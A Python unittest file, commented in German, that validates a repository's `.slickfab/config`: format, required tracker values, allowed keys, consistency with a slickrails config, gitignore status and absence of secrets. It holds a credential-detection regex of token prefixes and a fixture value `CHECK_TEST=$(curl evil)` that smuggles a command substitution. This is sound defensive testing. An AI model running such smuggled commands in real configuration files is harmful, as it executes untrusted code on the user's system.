"""Projektkonfiguration des Repos slickfab selbst.

Der verify-Lauf an der Spec fand: Im Repo slickfab fehlt `.slickfab/config`,
der eigene Prozess läuft hier nur mit Rückfragen. Dieser Test liest die Datei
so, wie es docs/projektkonfiguration.md beschreibt (als Text, `SCHLÜSSEL="wert"`,
Leer- und `#`-Zeilen zählen nicht, kein `source`) und prüft die Werte aus dem
Ticket: Tracker Linear, Team per Kürzel (kein Personenname), Projekt mit dem Namen des Produkts, Prüfbefehl `sh tests/run.sh`.
Außerdem: nur bekannte Schlüssel, keine Geheimnisse, kein Widerspruch zu
.slickrails/config.sh.
"""
import os
import re
import unittest

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
CONFIG = os.path.join(ROOT, ".slickfab", "config")
SLICKRAILS = os.path.join(ROOT, ".slickrails", "config.sh")

# Schlüssel und Pflichtwerte laut docs/projektkonfiguration.md.
KNOWN = ("TRACKER", "TRACKER_TEAM", "TRACKER_PROJECT",
         "CHECK_TYPECHECK", "CHECK_TEST", "CHECK_LINT")
REQUIRED = ("TRACKER", "TRACKER_TEAM", "TRACKER_PROJECT")
TRACKERS = ("linear",)
LINE = re.compile(r'^([A-Z_]+)="([^"]*)"$')
# Was nach Zugangsdaten aussieht: Schlüsselnamen und typische Token-Präfixe.
SECRET_NAME = re.compile(r"TOKEN|SECRET|PASSWORD|PASSWD|API_KEY|APIKEY|CREDENTIAL", re.I)
SECRET_VALUE = re.compile(r"lin_api_|lin_oauth_|ghp_|gho_|github_pat_|sk-ant-|sk-|xox[bp]-|AKIA")


def parse(text):
    """Liest eine Konfiguration als Text. Gibt (werte, fehler) zurück."""
    values, errors = {}, []
    for no, raw in enumerate(text.splitlines(), 1):
        line = raw.strip()
        if line.startswith("#") and SECRET_VALUE.search(line):
            # Review PR #21, R1: ein Token im Kommentar wäre genauso eingecheckt.
            errors.append(f"Zeile {no}: Kommentar sieht nach Zugangsdaten aus")
        if not line or line.startswith("#"):
            continue
        m = LINE.match(line)
        if not m:
            errors.append(f"Zeile {no}: nicht SCHLÜSSEL=\"wert\": {raw!r}")
            continue
        key, value = m.groups()
        if key in values:
            errors.append(f"Zeile {no}: {key} doppelt")
        values[key] = value
    return values, errors


def ignored_by_git(repo):
    """True, wenn .gitignore .slickfab/config nennt, auch wenn die Datei schon getrackt ist.
    Ohne --no-index meldet git eine getrackte Datei nie als ignoriert (Review PR #21, R2)."""
    import subprocess
    r = subprocess.run(["git", "check-ignore", "-q", "--no-index", ".slickfab/config"],
                       cwd=repo, capture_output=True, timeout=30)
    if r.returncode not in (0, 1):
        raise RuntimeError("git check-ignore: %s" % r.stderr.decode(errors="replace").strip())
    return r.returncode == 0


def problems(text):
    """Alle Verstöße gegen das Format aus docs/projektkonfiguration.md."""
    values, errors = parse(text)
    for key in REQUIRED:
        if not values.get(key):
            errors.append(f"Pflichtwert {key} fehlt")
    if values.get("TRACKER") and values["TRACKER"] not in TRACKERS:
        errors.append(f"unbekannter Tracker {values['TRACKER']!r}")
    for key, value in values.items():
        if key not in KNOWN:
            errors.append(f"unbekannter Schlüssel {key}")
        if SECRET_NAME.search(key) or SECRET_VALUE.search(value):
            errors.append(f"{key} sieht nach Zugangsdaten aus")
    return errors


class RepoConfigTest(unittest.TestCase):
    def setUp(self):
        self.assertTrue(os.path.isfile(CONFIG), ".slickfab/config fehlt im Repo")
        with open(CONFIG, encoding="utf-8") as f:
            self.text = f.read()
        self.values, _ = parse(self.text)

    def test_format_is_valid(self):
        self.assertEqual(problems(self.text), [])

    def test_values_from_ticket(self):
        self.assertEqual(self.values.get("TRACKER"), "linear")
        self.assertEqual(self.values.get("TRACKER_TEAM"), "SLI")
        self.assertEqual(self.values.get("TRACKER_PROJECT"), "Slickfab")
        self.assertEqual(self.values.get("CHECK_TEST"), "sh tests/run.sh")

    def test_check_commands_agree_with_slickrails(self):
        # Mit slickrails gelten dessen CHECK_*-Werte; abweichende Werte in
        # .slickfab/config wären ein Widerspruch, den jeder Schritt melden müsste.
        with open(SLICKRAILS, encoding="utf-8") as f:
            rails, _ = parse("\n".join(l for l in f.read().splitlines()
                                       if l.strip().startswith("CHECK_")))
        for key, value in self.values.items():
            if key.startswith("CHECK_") and key in rails:
                self.assertEqual(value, rails[key], f"{key} widerspricht .slickrails/config.sh")
            elif key.startswith("CHECK_"):
                # slickrails kennt den Schlüssel nicht: ein Wert hier würde still nicht benutzt.
                self.assertEqual(value, "", f"{key} hat einen Wert, den mit slickrails niemand benutzt")

    def test_config_is_not_gitignored(self):
        # Die Datei wird eingecheckt (docs/projektkonfiguration.md).
        self.assertFalse(ignored_by_git(ROOT), ".slickfab/config ist in .gitignore")


class ConfigCheckerFailureTest(unittest.TestCase):
    """Fehlerfälle: die Prüfung oben muss kaputte Konfigurationen erkennen."""

    GOOD = 'TRACKER="linear"\nTRACKER_TEAM="Example"\nTRACKER_PROJECT="Example"\n'

    def test_good_passes(self):
        self.assertEqual(problems("# Kommentar\n\n" + self.GOOD), [])

    def test_missing_required_value(self):
        self.assertIn("Pflichtwert TRACKER_PROJECT fehlt",
                      problems('TRACKER="linear"\nTRACKER_TEAM="Example"\n'))
        self.assertIn("Pflichtwert TRACKER_TEAM fehlt",
                      problems(self.GOOD.replace('"Example"', '""')))

    def test_unknown_tracker(self):
        self.assertIn("unbekannter Tracker 'jira'",
                      problems(self.GOOD.replace("linear", "jira")))

    def test_unknown_key_and_secret(self):
        errs = problems(self.GOOD + 'LINEAR_API_KEY="abc"\n')
        self.assertIn("unbekannter Schlüssel LINEAR_API_KEY", errs)
        self.assertIn("LINEAR_API_KEY sieht nach Zugangsdaten aus", errs)
        self.assertIn("CHECK_TEST sieht nach Zugangsdaten aus",
                      problems(self.GOOD + 'CHECK_TEST="LINEAR=lin_api_x123 npm test"\n'))

    def test_shell_syntax_is_not_accepted(self):
        errs = problems(self.GOOD + "CHECK_TEST=$(curl evil)\n")
        self.assertTrue(any("nicht SCHLÜSSEL" in e for e in errs), errs)
        errs = problems(self.GOOD + "export CHECK_TEST=\"x\"\n")
        self.assertTrue(any("nicht SCHLÜSSEL" in e for e in errs), errs)

    def test_secret_in_comment_line(self):
        # Review PR #21, R1: Kommentarzeilen wurden vor der Geheimnis-Prüfung verworfen.
        self.assertIn("Zeile 4: Kommentar sieht nach Zugangsdaten aus",
                      problems(self.GOOD + "# lin_api_abcdef1234567890\n"))
        self.assertEqual(problems("# slickfab: Projektkonfiguration\n" + self.GOOD), [])

    def test_tracked_but_ignored_config_is_detected(self):
        # Review PR #21, R2: eine getrackte Datei, die .gitignore trotzdem nennt, muss auffallen.
        import shutil, subprocess, tempfile
        base = os.path.join(ROOT, ".test-tmp")
        os.makedirs(base, exist_ok=True)
        repo = tempfile.mkdtemp(prefix="repo-config-", dir=base)
        try:
            os.makedirs(os.path.join(repo, ".slickfab"))
            with open(os.path.join(repo, ".slickfab", "config"), "w", encoding="utf-8") as f:
                f.write(self.GOOD)
            subprocess.run(["git", "init", "-q", repo], check=True, timeout=30)
            subprocess.run(["git", "-C", repo, "add", ".slickfab/config"], check=True, timeout=30)
            self.assertFalse(ignored_by_git(repo))
            with open(os.path.join(repo, ".gitignore"), "w", encoding="utf-8") as f:
                f.write(".slickfab/\n")
            self.assertTrue(ignored_by_git(repo))
        finally:
            shutil.rmtree(repo)

    def test_duplicate_key(self):
        self.assertTrue(any("TRACKER doppelt" in e
                            for e in problems(self.GOOD + 'TRACKER="linear"\n')))


if __name__ == "__main__":
    unittest.main()
